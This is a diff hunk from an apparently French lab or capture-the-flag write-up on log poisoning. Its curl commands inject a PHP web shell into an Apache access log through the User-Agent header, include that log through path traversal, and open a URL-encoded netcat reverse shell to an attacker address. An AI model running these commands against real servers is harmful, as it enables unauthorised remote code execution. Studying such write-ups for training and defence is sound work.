@@ -36,7 +36,7 @@ Par élimination, il reste donc les failles de type Log Poisoning à essayer. La
 
     curl  -A  "BACKDOOR <?php system(\$_GET['cmd'])?>" http://192.168.204.72 
     curl http://192.168.204.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id
-    curl  "http://192.168.204.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2F  
+    curl http://192.168.204.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2F  
     f%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.231%209001%20%3E%2Ftmp%2Ff
     cat /var/www/local.txt
 
